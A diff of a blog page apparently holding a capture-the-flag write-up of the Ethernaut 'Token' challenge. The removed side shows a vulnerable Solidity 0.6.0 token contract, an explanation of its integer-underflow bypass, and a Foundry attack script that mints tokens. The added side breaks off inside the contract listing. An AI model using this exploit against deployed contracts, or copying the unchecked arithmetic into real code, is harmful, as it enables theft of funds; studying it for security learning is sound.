@@ -1,335 +1,122 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>Token - Koyphshi</title><meta name="description" content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"><meta property="og:url" content="http://localhost:1313/ethernaut/token/">
-	<meta property="og:site_name" content="Koyphshi">
-	<meta property="og:title" content="Token">
-	<meta property="og:description" content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens">
-	<meta property="og:locale" content="en">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="ethernaut">
-		<meta property="article:published_time" content="2026-01-07T00:00:00+00:00">
-		<meta property="article:modified_time" content="2026-01-07T00:00:00+00:00">
-		<meta property="article:tag" content="Ethernaut">
-		<meta property="article:tag" content="Solidity">
-		<meta property="article:tag" content="Underflow">
-		<meta property="article:tag" content="Overflow">
-		<meta property="article:tag" content="Evm">
-		<meta property="og:image" content="http://localhost:1313/avatar/avatar.gif">
-
-	<meta name="twitter:card" content="summary_large_image">
-	<meta name="twitter:image" content="http://localhost:1313/avatar/avatar.gif">
-	<meta name="twitter:title" content="Token">
-	<meta name="twitter:description" content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens">
-<meta name="application-name" content="Koyphshi">
-<meta name="apple-mobile-web-app-title" content="Koyphshi"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/ethernaut/token/" /><link rel="prev" href="http://localhost:1313/ethernaut/vault/" /><link rel="next" href="http://localhost:1313/ethernaut/magic-number/" /><link rel="stylesheet" href="/css/page.min.css"><link rel="stylesheet" href="/css/home.min.css"><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "Token",
-        "inLanguage": "en",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/ethernaut\/token\/"
-        },"image": ["http:\/\/localhost:1313\/avatar\/avatar.gif"],"genre": "ethernaut","keywords": "ethernaut, solidity, underflow, overflow, evm","wordcount":  420 ,
-        "url": "http:\/\/localhost:1313\/ethernaut\/token\/","datePublished": "2026-01-07T00:00:00+00:00","dateModified": "2026-01-07T00:00:00+00:00","publisher": {
-            "@type": "Organization",
-            "name": "Koyphshi"},"author": {
-                "@type": "Person",
-                "name": "Koyphshi"
-            },"description": "Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"
-    }
-    </script></head><body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
-
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/" title="Koyphshi">Koyphshi</a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/about/">
-                            About
-                        </a><a class="menu-item" href="/posts/">
-                            Posts
-                        </a><a class="menu-item" href="/categories/">
-                            Categories
-                        </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
-                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fa-solid fa-search fa-fw"></i>
-                        </a>
-                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fa-solid fa-times-circle fa-fw"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fa-solid fa-spinner fa-fw fa-spin"></i>
-                        </span>
-                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fa-solid fa-adjust fa-fw"></i>
-                </a>
-            </div>
-        </div>
-    </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/" title="Koyphshi">Koyphshi</a>
-            </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><div class="search-wrapper">
-                    <div class="search mobile" id="search-mobile">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
-                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fa-solid fa-search fa-fw"></i>
-                        </a>
-                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fa-solid fa-times-circle fa-fw"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fa-solid fa-spinner fa-fw fa-spin"></i>
-                        </span>
-                    </div>
-                    <a href="#" class="search-cancel" id="search-cancel-mobile">
-                        Cancel
-                    </a>
-                </div><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><div class="menu-item"><a href="#" onclick="return false;" class="theme-switch" title="Switch Theme">
-                    <i class="fa-solid fa-adjust fa-fw"></i>
-                </a>
-            </div></div>
-    </div>
-</header><div class="search-dropdown desktop">
-    <div id="search-dropdown-desktop"></div>
-</div>
-<div class="search-dropdown mobile">
-    <div id="search-dropdown-mobile"></div>
-</div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto" style="top:8rem;">
-            <h2 class="toc-title">Contents</h2>
-            <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single special" data-toc="enable"><h2 class="single-title animated fadeInDown faster">Token</h2><div class="single-card" ><div class="details toc" id="toc-static"  data-kept="">
-                    <div class="details-summary toc-title">
-                        <span>Contents</span>
-                        <span><i class="details-icon fa-solid fa-angle-right"></i></span>
-                    </div>
-                    <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
-                </div><div class="content" id="content"><p>in this challenge we are given a simple token contract, we start with 20 tokens and our goal is to find a bug that allows us to get a large amount of tokens</p>
-<div class="details admonition info open">
-        <div class="details-summary admonition-title">
-            <i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><ul>
-<li><strong>Platform</strong>: Ethernaut</li>
-<li><strong>Challenge</strong>: Token</li>
-<li><strong>Category</strong>: Blockchain</li>
-</ul>
-</div>
-        </div>
-    </div>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Token</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_owner</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>first lets check the 20 tokens we have using <code>cast</code>:</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="http://localhost:1313/ethernaut/token/balance-check.png"
-        data-srcset="http://localhost:1313/ethernaut/token/balance-check.png, http://localhost:1313/ethernaut/token/balance-check.png 1.5x, http://localhost:1313/ethernaut/token/balance-check.png 2x"
-        data-sizes="auto"
-        alt="http://localhost:1313/ethernaut/token/balance-check.png"
-        title="http://localhost:1313/ethernaut/token/balance-check.png" /></p>
-<p>what this command does is simply send an <code>eth_call</code> which allows us to execute the view function locally in the node without spending any gas</p>
-<p>now the description tells us to check <code>odometer</code> — the special thing about it is that it resets after reaching a certain max number, similar to overflows</p>
-<p>in solidity versions before 0.8.0, overflow/underflow did happen and developers had to add custom checks or use libraries like safemath; in versions 0.8.x new opcodes have been added to arithmetic operations to prevent this</p>
-<p>returning to the contract, the version is 0.6.0 which is vulnerable to underflow:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>the only check is <code>require(balances[msg.sender] - _value &gt;= 0)</code> and the underflow applies here: if a contract has balance 0 and calls this with <code>_value = 100</code>, <code>balances[msg.sender] - _value</code> will be equal to <code>type(uint256).max - 99</code> which is bigger than 0, so we bypass the require and get tokens without losing any</p>
-<p>here is the solver script:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">attack</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Token</span> <span class="n">token</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="mh">0x284Cd6B2b7D4dC8a754c8fC34858529db5039eBb</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span><span class="n">Token</span> <span class="n">_token</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">_token</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">token</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="mi">6767676747</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Solver</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Token</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="mh">0xD71EA4b9951B1861115Ce3c5fdEcE2440b77d21B</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">     <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">     <span class="n">attack</span> <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">attack</span><span class="p">(</span><span class="n">instance</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>executing it locally:</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="http://localhost:1313/ethernaut/token/exploit-result.png"
-        data-srcset="http://localhost:1313/ethernaut/token/exploit-result.png, http://localhost:1313/ethernaut/token/exploit-result.png 1.5x, http://localhost:1313/ethernaut/token/exploit-result.png 2x"
-        data-sizes="auto"
-        alt="http://localhost:1313/ethernaut/token/exploit-result.png"
-        title="http://localhost:1313/ethernaut/token/exploit-result.png" /></p>
-<p>the exploit works fine, we just add the <code>--broadcast</code> flag to execute it remotely and gg the challenge is solved</p></div><div class="post-footer" id="post-footer">
-    <div class="post-info"><div class="post-info-tag"><span><a href="/tags/ethernaut/">Ethernaut</a>
-                </span><span><a href="/tags/solidity/">Solidity</a>
-                </span><span><a href="/tags/underflow/">Underflow</a>
-                </span><span><a href="/tags/overflow/">Overflow</a>
-                </span><span><a href="/tags/evm/">Evm</a>
-                </span></div><div class="post-info-line"><div class="post-info-mod">
-                <span>Updated on 2026-01-07</span>
-            </div><div class="post-info-mod"></div>
-        </div><div class="post-info-share">
-            <span><a href="#" onclick="return false;" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/ethernaut/token/" data-hashtag="ethernaut"><i class="fa-brands fa-facebook-square fa-fw"></i></a><a href="#" onclick="return false;" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/ethernaut/token/"><i class="fa-brands fa-linkedin fa-fw"></i></a></span>
-        </div></div><div class="related-content">
-            <h3 class="related-title">See Also</h3>
-            <div class="related-posts"><a class="related-post" href="/ethernaut/delegation/"><div class="related-post-image-placeholder">
-                                <i class="fa-solid fa-newspaper"></i>
-                            </div><div class="related-post-content">
-                            <span class="related-post-title">Delegation</span>
-                        </div>
-                    </a><a class="related-post" href="/posts/ethernaut/"><div class="related-post-image-placeholder">
-                                <i class="fa-solid fa-newspaper"></i>
-                            </div><div class="related-post-content">
-                            <span class="related-post-title">Ethernaut</span>
-                        </div>
-                    </a><a class="related-post" href="/ethernaut/force/"><div class="related-post-image-placeholder">
-                                <i class="fa-solid fa-newspaper"></i>
-                            </div><div class="related-post-content">
-                            <span class="related-post-title">Force</span>
-                        </div>
-                    </a><a class="related-post" href="/ethernaut/gatekeeper-one/"><div class="related-post-image-placeholder">
-                                <i class="fa-solid fa-newspaper"></i>
-                            </div><div class="related-post-content">
-                            <span class="related-post-title">Gatekeeper One</span>
-                        </div>
-                    </a><a class="related-post" href="/ethernaut/magic-number/"><div class="related-post-image-placeholder">
-                                <i class="fa-solid fa-newspaper"></i>
-                            </div><div class="related-post-content">
-                            <span class="related-post-title">Magic Number</span>
-                        </div>
-                    </a></div>
-        </div><div class="post-nav"><a href="/ethernaut/vault/" class="prev" rel="prev" title="Vault"><i class="fa-solid fa-angle-left fa-fw"></i>Previous Post</a>
-            <a href="/ethernaut/magic-number/" class="next" rel="next" title="Magic Number">Next Post<i class="fa-solid fa-angle-right fa-fw"></i></a></div></div>
-</div></article></div>
-            </main>
-            <footer class="footer"><div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.164.0 (ce2470e7012b5ab5fc4e10ebe4027e9f8d9e00dc)">Hugo</a> | Theme - <a href="https://github.com/khusika/FeelIt" target="_blank" rel="noopener noreffer" title="FeelIt 1.0.3"><i class="fa-solid fa-hand-holding-heart fa-fw"></i> FeelIt</a>
-        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/">Koyphshi</a></span></div>
-</div>
-</footer>
-        </div>
-
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fa-solid fa-chevron-up fa-fw"></i>
-            </a></div><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/css/custom.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/auto-render.min.js"></script><script src="/lib/katex/copy-tex.min.js"></script><script src="/lib/katex/mhchem.min.js"></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body></html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Token - Koyphshi</title><meta name=description content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"><meta property="og:url" content="https://lanaceryasser.github.io/ethernaut/token/"><meta property="og:site_name" content="Koyphshi"><meta property="og:title" content="Token"><meta property="og:description" content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="ethernaut"><meta property="article:published_time" content="2026-01-07T00:00:00+00:00"><meta property="article:modified_time" content="2026-01-07T00:00:00+00:00"><meta property="article:tag" content="Ethernaut"><meta property="article:tag" content="Solidity"><meta property="article:tag" content="Underflow"><meta property="article:tag" content="Overflow"><meta property="article:tag" content="Evm"><meta property="og:image" content="https://lanaceryasser.github.io/avatar/avatar.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://lanaceryasser.github.io/avatar/avatar.gif"><meta name=twitter:title content="Token"><meta name=twitter:description content="Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"><meta name=application-name content="Koyphshi"><meta name=apple-mobile-web-app-title content="Koyphshi"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://lanaceryasser.github.io/ethernaut/token/><link rel=prev href=https://lanaceryasser.github.io/ethernaut/vault/><link rel=next href=https://lanaceryasser.github.io/ethernaut/magic-number/><link rel=stylesheet href=/css/page.min.css><link rel=stylesheet href=/css/home.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Token","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/lanaceryasser.github.io\/ethernaut\/token\/"},"image":["https:\/\/lanaceryasser.github.io\/avatar\/avatar.gif"],"genre":"ethernaut","keywords":"ethernaut, solidity, underflow, overflow, evm","wordcount":420,"url":"https:\/\/lanaceryasser.github.io\/ethernaut\/token\/","datePublished":"2026-01-07T00:00:00+00:00","dateModified":"2026-01-07T00:00:00+00:00","publisher":{"@type":"Organization","name":"Koyphshi"},"author":{"@type":"Person","name":"Koyphshi"},"description":"Exploiting integer underflow in Solidity 0.6.0 to get infinite tokens"}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Koyphshi>Koyphshi</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/about/>About
+</a><a class=menu-item href=/posts/>Posts
+</a><a class=menu-item href=/categories/>Categories
+</a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fa-solid fa-search fa-fw"></i>
+</a><a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fa-solid fa-times-circle fa-fw"></i>
+</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin"></i>
+</span></span><a href=# onclick=return!1 class="menu-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Koyphshi>Koyphshi</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fa-solid fa-search fa-fw"></i>
+</a><a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fa-solid fa-times-circle fa-fw"></i>
+</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><div class=menu-item><a href=# onclick=return!1 class=theme-switch title="Switch Theme"><i class="fa-solid fa-adjust fa-fw"></i></a></div></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto style=top:8rem><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single special" data-toc=enable><h2 class="single-title animated fadeInDown faster">Token</h2><div class=single-card><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fa-solid fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents></nav></div></div><div class=content id=content><p>in this challenge we are given a simple token contract, we start with 20 tokens and our goal is to find a bug that allows us to get a large amount of tokens</p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content><ul><li><strong>Platform</strong>: Ethernaut</li><li><strong>Challenge</strong>: Token</li><li><strong>Category</strong>: Blockchain</li></ul></div></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
+</span></span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
